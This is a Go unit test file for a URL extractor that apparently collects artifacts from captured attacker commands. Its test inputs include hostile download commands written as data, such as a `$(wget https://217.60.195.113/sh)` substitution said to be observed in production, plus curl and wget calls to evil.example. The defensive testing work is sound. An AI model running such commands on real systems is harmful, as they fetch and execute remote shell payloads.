package capture

import "testing"

// A command substitution wraps the URL in parens: `$(wget https://h/sh)`.
// reHTTP's character class admits ')', so the captured token kept it and we
// recorded a second, unfetchable artifact row next to the real URL (observed on
// prod: both `https://217.60.195.113/sh` and `https://217.60.195.113/sh)`).
func TestExtractURLsDropsUnbalancedTrailingParen(t *testing.T) {
	got := ExtractURLs(`$(wget https://217.60.195.113/sh)`)
	if len(got) != 1 || got[0] != "https://217.60.195.113/sh" {
		t.Fatalf("got %v, want [https://217.60.195.113/sh]", got)
	}
}

// A URL may legitimately contain parens, so the trim must be balance-aware
// rather than a blanket TrimRight — otherwise we'd corrupt the real target.
func TestExtractURLsKeepsBalancedParens(t *testing.T) {
	got := ExtractURLs(`curl "http://evil.example/a_(b)"`)
	if len(got) != 1 || got[0] != "http://evil.example/a_(b)" {
		t.Fatalf("got %v, want [http://evil.example/a_(b)]", got)
	}
}

// Sentence/shell punctuation that cannot be part of a path.
func TestExtractURLsDropsTrailingSentencePunctuation(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`see http://evil.example/x.`, "http://evil.example/x"},
		{`wget http://evil.example/x,`, "http://evil.example/x"},
		{`(http://evil.example/x)`, "http://evil.example/x"},
		{`[http://evil.example/x]`, "http://evil.example/x"},
		{`{http://evil.example/x}`, "http://evil.example/x"},
	} {
		got := ExtractURLs(tc.in)
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("ExtractURLs(%q) = %v, want [%s]", tc.in, got, tc.want)
		}
	}
}

// Trailing slash and query strings are real URL syntax and must survive.
func TestExtractURLsPreservesRealURLSyntax(t *testing.T) {
	for _, want := range []string{
		"http://evil.example/",
		"http://evil.example/a?b=c",
		"http://evil.example/a#frag",
		"http://evil.example/a-b_c~d",
		// An IPv6 literal host ends in ']' with a matching '[' inside the
		// token, so the balance check must leave it alone.
		"http://[2001:db8::1]",
		"http://[2001:db8::1]:8080/x",
	} {
		got := ExtractURLs("curl " + want)
		if len(got) != 1 || got[0] != want {
			t.Errorf("ExtractURLs(curl %s) = %v, want [%s]", want, got, want)
		}
	}
}

// A token that is nothing but scheme + punctuation must not survive as a
// zero-length or scheme-only "URL" the fetcher would then try to dial.
func TestExtractURLsDropsPunctuationOnlyRemainder(t *testing.T) {
	if got := ExtractURLs(`echo http://).`); len(got) != 0 {
		t.Fatalf("got %v, want no urls", got)
	}
}
